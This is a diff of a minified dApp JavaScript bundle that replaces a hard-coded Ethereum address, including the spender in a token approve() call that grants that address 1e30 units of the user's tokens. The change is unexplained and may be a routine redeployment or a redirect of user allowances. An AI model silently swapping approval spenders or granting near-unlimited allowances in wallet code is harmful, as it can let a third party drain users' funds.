@@ -370,7 +370,7 @@
 			var K = n(408),
 				N = n(409),
 				q = 3,
-				X = "0x64F87Bad208CE284A1fac10f6248f7d1e161Ab2d",
+				X = "0x02871268B401599f105928b8B6fa63211e5108cC",
 				_ = "https://evm.sherpax.io/address/0x99eF0e29700797A92Bc500A3a87fCB8c473A8e93",
 				$ = Object(a.createContext)({
 					busdcontract: null,
@@ -595,7 +595,7 @@
 							return A.a.wrap((function(e) {
 								for (;;) switch (e.prev = e.next) {
 									case 0:
-										return L(!0), "0x64F87Bad208CE284A1fac10f6248f7d1e161Ab2d", e.prev = 2, e.next = 5, t.methods.approve("0x64F87Bad208CE284A1fac10f6248f7d1e161Ab2d", "1000000000000000000000000000000").send({
+										return L(!0), "0x02871268B401599f105928b8B6fa63211e5108cC", e.prev = 2, e.next = 5, t.methods.approve("0x02871268B401599f105928b8B6fa63211e5108cC", "1000000000000000000000000000000").send({
 											from: b   
 										}); 
 									case 5:
